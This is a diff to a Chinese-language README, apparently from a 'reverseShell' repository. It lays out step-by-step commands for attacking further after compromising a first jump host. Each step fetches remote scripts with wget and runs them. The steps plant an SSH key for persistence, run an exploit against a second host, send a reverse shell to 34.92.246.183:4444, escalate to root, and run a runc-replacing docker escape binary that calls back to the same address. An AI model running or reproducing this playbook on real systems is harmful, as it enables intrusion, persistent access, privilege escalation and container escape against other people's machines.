@@ -11,12 +11,27 @@ ddns.randomhhh.top:9000  经本地路由器端口转发后的端口为 4444
 
 # 拿下跳板机1后攻击流程的指令
 ### 下载addKey.sh 修改权限， 执行，配置主机的ssh公钥，用于ssh登录
-wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/addkey.sh && chmod 755 ./addkey.sh && ./addkey.sh 
+```bash
+wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/addkey.sh && chmod 755 ./addkey.sh && ./addkey.sh
+``` 
 ### 下载exploitFirst.py 执行，攻击跳板机2
+```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/exploitFirst.py && python exploitFirst.py
+```
 ### webshell内下载reverse1.sh 修改权限，反弹shell到 34.92.246.183:4444
-wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/reverse1.sh && chmod 755 ./reverse1.sh && ./reverse1.sh
+```bash
+wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/reverse1.sh 
+chmod 755 ./reverse1.sh 
+./reverse1.sh
+```
 ### 下载getPty.py ,执行,获取pty
+```bash
 wget wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/getPty.py && python getPty.py
+```
 ### 下载upRight.sh, 修改权限，执行，提权至root
+```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/upRight.sh && chmod 755 ./upRight.sh && ./upRight.sh
+```
+### 下载预先编译的沙箱逃逸二进制，修改权限，执行，在docker外反弹一个shell至 34.92.246.183:4444
+```bash
+wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/replaceRunc && chmod 755 ./replaceRunc && ./replaceRunc
